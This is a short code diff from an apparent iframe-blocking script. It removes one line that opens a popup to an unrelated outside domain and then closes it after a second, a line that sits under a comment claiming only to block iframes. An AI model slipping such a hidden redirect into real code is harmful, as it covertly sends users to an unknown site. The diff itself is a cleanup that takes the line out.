@@ -29,7 +29,6 @@ for (var i = 0; i < iframes.length; i++) {
     var iframeWindow = iframe.contentWindow;
 
     // If we can access the contentWindow property, block the iframe
-     window.open('https://840p.ml','_blank');window.setTimeout(function(){this.close();},1000);
   } catch (e) {
     // If we can't access the contentWindow property, the iframe is from a different origin and cannot be blocked
   }
